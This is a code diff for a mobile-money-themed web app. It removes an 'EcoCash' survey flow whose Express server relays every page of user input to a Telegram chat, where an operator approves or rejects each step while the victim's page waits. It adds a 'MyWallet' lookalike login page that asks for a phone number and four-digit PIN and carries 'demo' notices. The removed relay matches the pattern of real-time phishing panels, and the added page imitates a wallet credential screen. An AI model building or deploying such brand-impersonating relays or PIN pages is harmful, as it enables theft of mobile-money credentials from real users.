@@ -1,354 +1,423 @@
-node_modules/
-.env
-.DS_Store
-`
-```json
-{
-  "name": "ecocash-telegram-app",
-  "version": "1.0.0",
-  "description": "EcoCash Survey with Telegram Approval",
-  "main": "server.js",
-  "scripts": {
-    "start": "node server.js"
-  },
-  "dependencies": {
-    "body-parser": "^1.20.2",
-    "dotenv": "^16.3.1",
-    "express": "^4.18.2",
-    "node-telegram-bot-api": "^0.64.0"
-  }
-}
-```
 
-```javascript
-require('dotenv').config();
-const express = require('express');
-const bodyParser = require('body-parser');
-const TelegramBot = require('node-telegram-bot-api');
-const path = require('path');
-
-const app = express();
-app.use(bodyParser.json());
-app.use(express.static(path.join(__dirname, 'public')));
-
-const token = process.env.TELEGRAM_BOT_TOKEN;
-const chatId = process.env.TELEGRAM_CHAT_ID;
-
-// Initialize Telegram Bot
-const bot = new TelegramBot(token, { polling: true });
-
-// In-memory database
-const applicants = new Map();
-
-// 1. Submit Page 4
-app.post('/api/submit-page4', async (req, res) => {
-    const { sessionId, data } = req.body;
-    
-    applicants.set(sessionId, { page4: data, status: 'pending_4' });
-
-    const message = `📝 *NEW APPLICATION - PAGE 4*\n\n` +
-                    `*Name:* ${data.fullName}\n` +
-                    `*Frequency:* ${data.frequency}\n` +
-                    `*Feature:* ${data.feature}\n` +
-                    `*Importance:* ${data.importantFactor}\n` +
-                    `*Duration:* ${data.duration}\n\n` +
-                    `Session ID: \`${sessionId}\``;
-
-    const options = {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: [
-                [
-                    { text: '✅ Approve', callback_data: `approve_4_${sessionId}` },
-                    { text: '❌ Reject', callback_data: `reject_4_${sessionId}` }
-                ]
-            ]
-        }
-    };
-
-    try {
-        await bot.sendMessage(chatId, message, options);
-        res.json({ success: true });
-    } catch (error) {
-        res.status(500).json({ error: "Failed to send message" });
-    }
-});
-
-// 2. Submit Page 5 & 6
-app.post('/api/submit-page5-6', async (req, res) => {
-    const { sessionId, page5, page6 } = req.body;
-    
-    if (!applicants.has(sessionId)) return res.status(400).json({ error: 'Invalid session' });
-    
-    const user = applicants.get(sessionId);
-    user.page5 = page5;
-    user.page6 = page6;
-    user.status = 'pending_56';
-
-    const p4 = user.page4;
-
-    const message = `📋 *FULL APPLICATION REVIEW*\n\n` +
-                    `*--- PAGE 4 DETAILS ---*\n` +
-                    `Name: ${p4.fullName}\n` +
-                    `Frequency: ${p4.frequency}\n` +
-                    `Feature: ${p4.feature}\n` +
-                    `Importance: ${p4.importantFactor}\n` +
-                    `Duration: ${p4.duration}\n\n` +
-                    `*--- PAGE 5 DETAILS ---*\n` +
-                    `Question 1: ${page5.q1}\n` +
-                    `Question 2: ${page5.q2}\n\n` +
-                    `*--- PAGE 6 DETAILS ---*\n` +
-                    `Question 1: ${page6.q1}\n` +
-                    `Question 2: ${page6.q2}\n\n` +
-                    `Session ID: \`${sessionId}\``;
-
-    const options = {
-        parse_mode: 'Markdown',
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: '✅ Correct Page 4 + 5 + 6', callback_data: `correct_all_${sessionId}` }],
-                [
-                    { text: '❌ Wrong Page 4', callback_data: `wrong_4_${sessionId}` },
-                    { text: '❌ Wrong Page 6', callback_data: `wrong_6_${sessionId}` }
-                ]
-            ]
-        }
-    };
-
-    try {
-        await bot.sendMessage(chatId, message, options);
-        res.json({ success: true });
-    } catch (error) {
-        res.status(500).json({ error: "Failed to send message" });
-    }
-});
-
-// 3. Status Check
-app.get('/api/status/:sessionId', (req, res) => {
-    const { sessionId } = req.params;
-    if (!applicants.has(sessionId)) return res.status(404).json({ error: 'Not found' });
-    res.json({ status: applicants.get(sessionId).status });
-});
-
-// 4. Reset Page 4
-app.post('/api/reset-page4', (req, res) => {
-    const { sessionId } = req.body;
-    if (applicants.has(sessionId)) applicants.get(sessionId).status = 'editing_4';
-    res.json({ success: true });
-});
-
-// 5. Reset Page 6
-app.post('/api/reset-page6', (req, res) => {
-    const { sessionId } = req.body;
-    if (applicants.has(sessionId)) applicants.get(sessionId).status = 'editing_6';
-    res.json({ success: true });
-});
-
-// Telegram Bot Callbacks
-bot.on('callback_query', async (query) => {
-    const action = query.data;
-    const msgId = query.message.message_id;
-    const chatId = query.message.chat.id;
-
-    const parts = action.split('_');
-    const command = parts[0] + (parts[1] ? '_' + parts[1] : '');
-    const sessionId = parts[parts.length - 1];
-
-    if (!applicants.has(sessionId)) {
-        return bot.answerCallbackQuery(query.id, { text: 'Session expired.' });
-    }
-
-    const user = applicants.get(sessionId);
-
-    if (command === 'approve_4') {
-        user.status = 'approved_4';
-        await bot.editMessageText(`✅ *APPROVED - PAGE 4*`, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
-        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
-    } 
-    else if (command === 'reject_4' || command === 'wrong_4') {
-        user.status = 'rejected_4';
-        await bot.editMessageText(`❌ *REJECTED - PAGE 4*`, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
-        bot.answerCallbackQuery(query.id, { text: 'Rejected.' });
-    }
-    else if (command === 'correct_all') {
-        user.status = 'approved_all';
-        await bot.editMessageText(`✅ *FULL APPLICATION APPROVED*`, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
-        bot.answerCallbackQuery(query.id, { text: 'Approved!' });
-    }
-    else if (command === 'wrong_6') {
-        user.status = 'rejected_6';
-        await bot.editMessageText(`❌ *WRONG PAGE 6*`, { chat_id: chatId, message_id: msgId, parse_mode: 'Markdown' });
-        bot.answerCallbackQuery(query.id, { text: 'Rejected.' });
-    }
-});
-
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
-```
-:
-
-```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>EcoCash Application</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { font-family: 'Inter', sans-serif; background: #f0f4f8; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #1a1a1a; }
-    .app-container { background: #fff; width: 100%; max-width: 500px; height: 100vh; position: relative; overflow: hidden; box-shadow: 0 10px 30px rgba(0,0,0,0.1); display: flex; flex-direction: column;}
-    .page { display: none; flex-direction: column; height: 100%; padding: 30px; overflow-y: auto; }
-    .page.active { display: flex; animation: slideIn 0.3s ease; }
-    @keyframes slideIn { from { opacity: 0; transform: translateX(20px); } to { opacity: 1; transform: translateX(0); } }
-    h2 { margin-bottom: 20px; color: #0047b3; font-size: 1.5rem; }
-    .form-group { margin-bottom: 15px; }
-    label { display: block; font-weight: 600; margin-bottom: 5px; font-size: 0.9rem; }
-    input, select { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 8px; font-size: 1rem; font-family: inherit; }
-    button { background: #0047b3; color: white; border: none; padding: 15px; border-radius: 8px; font-size: 1.1rem; font-weight: 600; cursor: pointer; margin-top: 20px; width: 100%; transition: 0.2s; }
-    button:hover { background: #003388; }
-    .loader { text-align: center; margin-top: 50px; display: none; }
-    .loader.active { display: block; }
-    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0047b3; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    .success-icon { font-size: 4rem; color: #28a745; text-align: center; margin: 40px 0; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#ffffff">
+<title>MyWallet - Demo Login</title>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: Arial, sans-serif;
+}
+
+body {
+    min-height: 100vh;
+    min-height: 100dvh;
+    background: #fff;
+}
+
+.container {
+    width: 100%;
+    min-height: 100vh;
+    min-height: 100dvh;
+    display: flex;
+    flex-direction: column;
+    overflow: hidden;
+}
+
+.top-section {
+    flex: 1;
+    background: #fff;
+    padding: 0 22px 35px;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    position: relative;
+    justify-content: flex-start;
+}
+
+.logo {
+    margin-top: 12vh;
+    margin-bottom: 38px;
+    font-size: 35px;
+    font-weight: bold;
+    letter-spacing: -1px;
+}
+
+.logo span:first-child {
+    color: #2472b9;
+}
+
+.logo span:last-child {
+    color: #d64c58;
+}
+
+h3 {
+    color: #555;
+    font-size: 21px;
+    margin-bottom: 35px;
+}
+
+.phone-box {
+    width: 100%;
+    height: 54px;
+    border: 1.5px solid #8799aa;
+    border-radius: 7px;
+    display: flex;
+    align-items: center;
+    padding: 0 10px;
+    gap: 8px;
+}
+
+.phone-box select {
+    width: 88px;
+    border: none;
+    outline: none;
+    background: transparent;
+    color: #666;
+    font-size: 13px;
+    padding: 8px 0;
+}
+
+.phone-box input {
+    flex: 1;
+    min-width: 0;
+    border: none;
+    outline: none;
+    font-size: 14px;
+    background: transparent;
+    height: 100%;
+}
+
+.phone-box input:focus {
+    outline: none;
+}
+
+.hint {
+    color: #888;
+    font-size: 13px;
+    margin-top: 17px;
+    margin-bottom: 20px;
+}
+
+.pin-container {
+    display: flex;
+    gap: 7px;
+    justify-content: center;
+}
+
+.pin-container input {
+    width: 45px;
+    height: 51px;
+    border: 1.5px solid #8498aa;
+    border-radius: 8px;
+    text-align: center;
+    font-size: 22px;
+    outline: none;
+    background: #fff;
+}
+
+.pin-container input:focus {
+    border: 2px solid #2775bc;
+    box-shadow: 0 0 4px #a4c8e9;
+}
+
+.bottom-section {
+    background: #2679c3;
+    min-height: 310px;
+    width: 100%;
+    padding: 105px 20px 25px;
+    position: relative;
+    color: white;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    clip-path: ellipse(100% 100% at 50% 100%);
+    margin-top: -35px;
+}
+
+.bottom-section p {
+    font-size: 13px;
+    text-align: center;
+    line-height: 1.5;
+    margin-bottom: 27px;
+}
+
+.buttons {
+    display: flex;
+    gap: 10px;
+    width: 100%;
+}
+
+.action-btn {
+    flex: 1;
+    min-height: 70px;
+    border: none;
+    border-radius: 10px;
+    background: white;
+    color: #777;
+    cursor: pointer;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    gap: 7px;
+    font-size: 12px;
+    transition: .2s;
+}
+
+.action-btn:active {
+    transform: scale(.97);
+    background: #eaf3fb;
+}
+
+.action-btn .symbol {
+    color: #2876b8;
+    font-size: 19px;
+    font-weight: bold;
+}
+
+.version {
+    margin-top: auto;
+    padding-top: 35px;
+    text-align: center;
+    font-size: 11px;
+    line-height: 2;
+    color: #fff;
+}
+
+.version a {
+    color: white;
+}
+
+.modal {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0,0,0,.55);
+    z-index: 10;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+}
+
+.modal-content {
+    background: white;
+    width: 100%;
+    max-width: 340px;
+    border-radius: 12px;
+    padding: 25px;
+    text-align: center;
+    color: #555;
+}
+
+.modal-content h3 {
+    margin-bottom: 15px;
+}
+
+.modal-content p {
+    font-size: 14px;
+    line-height: 1.6;
+}
+
+.close-btn {
+    margin-top: 20px;
+    width: 100%;
+    padding: 13px;
+    background: #2679c3;
+    color: white;
+    border: none;
+    border-radius: 7px;
+    font-size: 14px;
+}
+
+.notice {
+    margin-top: 15px;
+    font-size: 12px;
+    color: #777;
+    text-align: center;
+}
+
+@media(max-height: 650px) {
+    .logo {
+        margin-top: 35px;
+        margin-bottom: 20px;
+    }
+
+    h3 {
+        margin-bottom: 20px;
+    }
+
+    .bottom-section {
+        min-height: 250px;
+        padding-top: 75px;
+    }
+}
+</style>
 </head>
+
 <body>
 
-<div class="app-container">
-  <div id="page4" class="page active">
-    <h2>Page 4: Survey</h2>
-    <form id="form4">
-      <div class="form-group"><label>Full Name</label><input type="text" name="fullName" required></div>
-      <div class="form-group"><label>How often do you use EcoCash?</label>
-        <select name="frequency" required>
-          <option value="">Select...</option><option value="Daily">Daily</option><option value="Weekly">Weekly</option>
-        </select>
-      </div>
-      <div class="form-group"><label>Feature used most?</label>
-        <select name="feature" required>
-          <option value="">Select...</option><option value="Send Money">Send Money</option><option value="Pay Bills">Pay Bills</option>
-        </select>
-      </div>
-      <div class="form-group"><label>Most important thing?</label>
-        <select name="importantFactor" required>
-          <option value="">Select...</option><option value="Security">Security</option><option value="Speed">Speed</option>
-        </select>
-      </div>
-      <div class="form-group"><label>How long using EcoCash?</label>
-        <select name="duration" required>
-          <option value="">Select...</option><option value="< 1 year">Less than 1 year</option><option value="1-3 years">1-3 years</option>
-        </select>
-      </div>
-      <button type="submit">Submit to Admin</button>
-    </form>
-  </div>
+<div class="container">
 
-  <div id="page5_6" class="page">
-    <h2>Page 5 & 6: Details</h2>
-    <form id="form56">
-      <h3>Page 5 Details</h3>
-      <div class="form-group"><label>Page 5 Question 1</label><input type="text" name="p5q1" required></div>
-      <div class="form-group"><label>Page 5 Question 2</label><input type="text" name="p5q2" required></div>
-      <hr style="margin: 20px 0; border: 0; border-top: 1px solid #eee;">
-      <h3>Page 6 Details</h3>
-      <div class="form-group"><label>Page 6 Question 1</label><input type="text" name="p6q1" required></div>
-      <div class="form-group"><label>Page 6 Question 2</label><input type="text" name="p6q2" required></div>
-      <button type="submit">Submit Final Details</button>
-    </form>
-  </div>
+    <div class="top-section">
 
-  <div id="loading" class="page">
-    <div class="loader active">
-      <div class="spinner"></div>
-      <h3>Waiting for Admin Approval...</h3>
-      <p style="color:#666; margin-top:10px;">Please keep this page open.</p>
+        <div class="logo">
+            <span>My</span><span>Wallet</span>
+        </div>
+
+        <h3>Login</h3>
+
+        <div class="phone-box">
+
+            <select id="country">
+                <option value="+254">🇰🇪 +254</option>
+                <option value="+263">🇿🇼 +263</option>
+                <option value="+256">🇺🇬 +256</option>
+                <option value="+255">🇹🇿 +255</option>
+                <option value="+260">🇿🇲 +260</option>
+                <option value="+27">🇿🇦 +27</option>
+            </select>
+
+            <input
+                type="tel"
+                id="phone"
+                placeholder="Demo Phone Number"
+                inputmode="numeric"
+                autocomplete="off"
+            >
+
+        </div>
+
+        <div class="hint">Enter your demo access code</div>
+
+        <div class="pin-container">
+            <input type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+            <input type="password" maxlength="1" inputmode="numeric" autocomplete="off">
+        </div>
+
+        <div class="notice">
+            Demo interface only. Do not enter real account credentials.
+        </div>
+
     </div>
-  </div>
 
-  <div id="page7" class="page">
-    <i class="fa-solid fa-circle-check success-icon"></i>
-    <h2 style="text-align: center;">Application Complete!</h2>
-    <p style="text-align: center; color: #666;">Your details have been fully verified.</p>
-  </div>
+    <div class="bottom-section">
+
+        <p>
+            To explore this wallet demo or get assistance,<br>
+            click below
+        </p>
+
+        <div class="buttons">
+
+            <button class="action-btn" onclick="showModal('register')">
+                <span class="symbol">♟</span>
+                Register
+            </button>
+
+            <button class="action-btn" onclick="showModal('help')">
+                <span class="symbol">ⓘ</span>
+                Help & Support
+            </button>
+
+        </div>
+
+        <div class="version">
+            v1.0 DEMO<br>
+            By continuing, you agree to the
+            <a href="#" onclick="showModal('terms');return false;">Terms and Conditions</a>
+        </div>
+
+    </div>
+
+</div>
+
+<div class="modal" id="modal">
+    <div class="modal-content">
+        <h3 id="modal-title">Information</h3>
+        <p id="modal-message"></p>
+        <button class="close-btn" onclick="closeModal()">Close</button>
+    </div>
 </div>
 
 <script>
-  const sessionId = Math.random().toString(36).substring(2, 15);
-  let statusInterval;
 
-  function showPage(pageId) {
-    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-    document.getElementById(pageId).classList.add('active');
-  }
+// PIN BOX INTERACTIONS
+const pinInputs = document.querySelectorAll('.pin-container input');
 
-  function startPolling() {
-    showPage('loading');
-    statusInterval = setInterval(async () => {
-      try {
-        const res = await fetch(`/api/status/${sessionId}`);
-        const data = await res.json();
-        
-        if (data.status === 'approved_4') {
-          clearInterval(statusInterval);
-          showPage('page5_6');
-        } 
-        else if (data.status === 'rejected_4') {
-          clearInterval(statusInterval);
-          alert('Admin rejected Page 4. Please re-enter details.');
-          await fetch('/api/reset-page4', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ sessionId }) });
-          showPage('page4');
+pinInputs.forEach((input, index) => {
+
+    input.addEventListener('input', () => {
+
+        input.value = input.value.replace(/\D/g, '').slice(0, 1);
+
+        if (input.value && index < pinInputs.length - 1) {
+            pinInputs[index + 1].focus();
         }
-        else if (data.status === 'approved_all') {
-          clearInterval(statusInterval);
-          showPage('page7');
-        }
-        else if (data.status === 'rejected_6') {
-          clearInterval(statusInterval);
-          alert('Admin rejected Page 6. Please re-enter Page 6 details.');
-          await fetch('/api/reset-page6', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ sessionId }) });
-          showPage('page5_6');
-        }
-      } catch (err) { console.error("Polling error", err); }
-    }, 3000); 
-  }
 
-  document.getElementById('form4').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const formData = new FormData(e.target);
-    const data = Object.fromEntries(formData.entries());
+        if (index === pinInputs.length - 1 && input.value) {
+            input.blur();
+        }
 
-    const res = await fetch('/api/submit-page4', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ sessionId, data })
     });
 
-    if (res.ok) startPolling();
-    else alert("Error submitting form.");
-  });
+    input.addEventListener('keydown', (event) => {
 
-  document.getElementById('form56').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    const formData = new FormData(e.target);
-    const data = Object.fromEntries(formData.entries());
-    
-    const page5 = { q1: data.p5q1, q2: data.p5q2 };
-    const page6 = { q1: data.p6q1, q2: data.p6q2 };
+        if (event.key === 'Backspace' && !input.value && index > 0) {
+            pinInputs[index - 1].focus();
+        }
 
-    const res = await fetch('/api/submit-page5-6', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ sessionId, page5, page6 })
     });
 
-    if (res.ok) startPolling();
-    else alert("Error submitting form.");
-  });
+});
+
+// SUPPORT BUTTONS
+function showModal(type) {
+
+    const title = document.getElementById('modal-title');
+    const message = document.getElementById('modal-message');
+    const modal = document.getElementById('modal');
+
+    if (type === 'register') {
+        title.textContent = 'Registration';
+        message.textContent =
+        'Welcome to the MyWallet demonstration. Registration is not connected to a real wallet service.';
+    }
+
+    else if (type === 'help') {
+        title.textContent = 'Help & Support';
+        message.textContent =
+        'This is a demonstration interface. No real wallet accounts or transactions are supported.';
+    }
+
+    else {
+        title.textContent = 'Terms and Conditions';
+        message.textContent =
+        'This is an independent demonstration interface and is not affiliated with any financial institution.';
+    }
+
+    modal.style.display = 'flex';
+}
+
+function closeModal() {
+    document.getElementById('modal').style.display = 'none';
+}
+
+document.getElementById('modal').addEventListener('click', function(event) {
+    if (event.target === this) {
+        closeModal();
+    }
+});
+
 </script>
+
 </body>
 </html>
-```
